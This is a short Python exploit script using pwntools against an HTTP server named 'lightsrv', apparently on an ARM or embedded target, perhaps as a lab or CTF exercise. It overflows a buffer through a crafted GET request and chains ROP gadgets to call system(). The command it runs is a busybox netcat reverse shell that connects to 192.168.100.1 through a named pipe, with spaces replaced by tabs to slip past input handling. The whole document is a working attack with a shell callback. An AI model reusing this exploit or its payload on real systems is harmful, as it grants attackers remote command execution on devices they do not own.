from pwn import *
import pwnlib.util.packing


BASE_ADDRESSES = {
    "libgcc": 0x40018000,
    "lightsrv": 0x10000
}
GADGETS = {
    "libgcc": {
        "pop {x0}": 0x4da4
    },
    "lightsrv": {
        "system": 0x93c
    }
}
COMMAND_ADDRESS = 0xbeffea13

# busybox netcat can't run a standard nc reverse shell,
# so instead we pipe input through a file
# also, we replace the first space with a null, so replace all spaces with tabs
# note the fun pipe tricks we need to pull to get busybox netcat working...
COMMAND = "rm -f /tmp/f;mknod /tmp/f p;/bin/busybox ash 0</tmp/f | nc 192.168.100.1 52608 > /tmp/f;".replace(" ", "\t")


def gadget(lib, key):
    ret = BASE_ADDRESSES[lib] + GADGETS[lib][key]
    print(f"[+] Generated gadget {hex(ret)} in lib {lib} for key {key}")
    return ret


def main():
    payload = bytes(COMMAND, "ascii") + b"\xAA" * (0x818 - len(COMMAND) - 0x1b - 0xd)  # assumes len(payload) is 4 bytes | +4 since the copied string is after "GET "
    payload += pwnlib.util.packing.pack(gadget("libgcc", "pop {x0}"), 32, "little")
    payload += pwnlib.util.packing.pack(COMMAND_ADDRESS, 32, "little")

    # has to be the last gadget, since the address has null bytes
    payload += pwnlib.util.packing.pack(gadget("lightsrv", "system"), 32, "little")
    payload += b"\x20"  # replaced by a null byte by handle_req

    first_message = bytes(f"GET Content-Length:{len(payload)}", "ascii") + b"\r\n\r\n"

    io = tubes.remote.remote("localhost", 28080, typ="tcp")
    io.send(first_message)
    sleep(1)
    io.send(payload)
    io.recvall()  # have to receive the "Not Implemented" response, or the program will crash with sigpipe


if __name__ == "__main__":
    main()
